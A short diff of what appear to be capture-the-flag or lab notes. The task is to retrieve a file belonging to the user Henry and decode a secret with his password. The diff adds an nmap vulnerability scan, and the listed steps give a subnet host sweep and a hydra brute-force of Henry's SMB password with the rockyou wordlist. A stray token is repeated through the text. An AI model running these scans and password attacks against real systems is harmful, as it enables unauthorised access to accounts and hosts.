@@ -14,7 +14,7 @@ Henry and obtain Sniff.txt;nvkwj2387 file containing an encoded secret.
 Decrypt the encoded secret and enter the decrypted text as
 the answer. Note: Use Henry's password to decode the text;nvkwj2387.
 nvkwj2387
-
+nmap -sV --script vulners -oN vuln.txt 10.10.11.95
 
 step 1 - nmap -T4 -p445 -sn 192.168.0.0/24 -oN livehosts.txt
 step 2 - hydra -l henry -P /usr/share/wordlists/rockyou.txt -t 4 -f smb://192.168.0.15
